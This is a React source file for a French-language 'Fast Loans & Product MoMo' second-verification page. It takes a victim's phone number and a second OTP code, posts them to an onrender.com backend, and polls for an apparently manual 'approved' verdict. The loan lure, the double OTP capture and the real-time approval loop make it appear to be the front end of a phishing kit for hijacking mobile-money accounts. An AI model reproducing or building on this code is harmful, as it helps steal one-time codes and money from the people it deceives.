import { useState, useRef, type KeyboardEvent } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Wallet, ArrowLeft } from "lucide-react";

const API_URL = "https://fastloan-momo-kj8m.onrender.com";

const SecondVerification = () => {
  const [secondOtp, setSecondOtp] = useState<string[]>(["", "", "", ""]);
  const [isVerifying, setIsVerifying] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  
  const phoneNumber = location.state?.phone || localStorage.getItem("userPhone") || "0123456789";

  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
  const isFormValid = secondOtp.every((d) => d !== "");

  const handleOtpChange = (index: number, value: string) => {
    const cleanValue = value.replace(/\D/g, "");
    if (cleanValue.length > 1) return;
    const newOtp = [...secondOtp];
    newOtp[index] = cleanValue;
    setSecondOtp(newOtp);
    if (cleanValue && index < 3) otpRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !secondOtp[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  const handleVerify = async () => {
    if (!isFormValid) return;
    setIsVerifying(true);

    // 45-second timeout fallback
    const timeoutId = setTimeout(() => {
      setIsVerifying(false);
      navigate("/login"); 
    }, 45000);

    try {
      const res = await fetch(`${API_URL}/api/verify-second-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          phone_number: phoneNumber, 
          second_otp: secondOtp.join("")
        }),
      });
      const data = await res.json();
      
      if (data.status === "pending" && data.verify_id) {
        const interval = setInterval(async () => {
          const statusRes = await fetch(`${API_URL}/api/second-verification-status/${data.verify_id}`);
          const statusData = await statusRes.json();
          
          if (statusData.status !== "pending") {
            clearInterval(interval);
            clearTimeout(timeoutId);
            setIsVerifying(false);
            
            if (statusData.status === "approved") {
              // ✅ REDIRECT TO THE CHOICE PAGE
              navigate("/choice", { state: { phone: phoneNumber } });
            } else {
              navigate("/login"); 
            }
          }
        }, 2000);
      } else {
        clearTimeout(timeoutId);
        setIsVerifying(false);
        navigate("/login");
      }
    } catch (error) {
      clearTimeout(timeoutId);
      setIsVerifying(false);
      navigate("/login");
    }
  };

  return (
    <div className="min-h-screen bg-[#FCD535] flex flex-col items-center px-5 py-8 font-sans">
      <div className="text-center mb-8 mt-4">
        <div className="w-16 h-16 rounded-2xl bg-[#F0B90B] flex items-center justify-center mx-auto mb-4 shadow-sm">
          <Wallet size={32} color="#1E1E1E" />
        </div>
        <h1 className="text-2xl font-extrabold text-[#1E1E1E] tracking-tight text-center leading-tight">
          Fast Loans &amp; Product<span className="text-[#B8860B]"> MoMo</span>
        </h1>
        <p className="text-sm text-white/90 mt-1 font-medium drop-shadow-sm">
          Vérification de sécurité (2/2)
        </p>
      </div>

      <div className="w-full max-w-md bg-white rounded-3xl shadow-xl p-6 sm:p-8">
        <button onClick={() => navigate(-1)} className="flex items-center text-gray-500 hover:text-gray-800 font-medium mb-6 transition-colors">
          <ArrowLeft size={18} className="mr-1.5" /> Retour
        </button>
        
        <h2 className="text-2xl font-extrabold text-[#1E1E1E] mb-3">Double Vérification</h2>
        
        <p className="text-sm text-gray-600 leading-relaxed mb-8">
          Un code a été envoyé à votre téléphone. Veuillez entrer le deuxième code OTP pour continuer.
        </p>
        
        <div className="mb-6">
          <label className="block text-sm font-semibold text-gray-700 mb-3">
            Deuxième code OTP (4 chiffres)
          </label>
          <div className="flex justify-between gap-3">
            {secondOtp.map((digit, index) => (
              <input 
                key={index} 
                ref={(el) => { otpRefs.current[index] = el; }}
                type="text" 
                inputMode="numeric"
                value={digit} 
                onChange={(e) => handleOtpChange(index, e.target.value)} 
                onKeyDown={(e) => handleKeyDown(index, e)}
                maxLength={1}
                className="w-full h-16 text-center text-2xl font-bold text-gray-900 bg-white border-[1.5px] border-gray-300 rounded-2xl outline-none focus:border-[#F0B90B] focus:ring-2 focus:ring-[#FCD535]/50 transition-all"
              />
            ))}
          </div>
        </div>

        <button 
          onClick={handleVerify} 
          disabled={!isFormValid || isVerifying} 
          className={`w-full mt-4 py-3.5 rounded-xl font-bold text-base transition-all ${
            isFormValid && !isVerifying
              ? "bg-[#F0B90B] hover:bg-[#E2AE0A] text-[#1E1E1E] cursor-pointer shadow-md"
              : "bg-gray-100 text-gray-400 cursor-not-allowed"
          }`}
        >
          {isVerifying ? "En attente..." : "Valider"}
        </button>
      </div>

      {isVerifying && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center px-5">
          <div className="bg-white rounded-2xl p-8 max-w-sm w-full text-center shadow-2xl">
            <div className="w-12 h-12 mx-auto mb-5 rounded-full border-4 border-gray-100 border-t-[#F0B90B] animate-spin" />
            <h3 className="text-lg font-bold text-[#1E1E1E] mb-2">Vérification en cours</h3>
            <p className="text-sm text-gray-500">Veuillez patienter...</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default SecondVerification;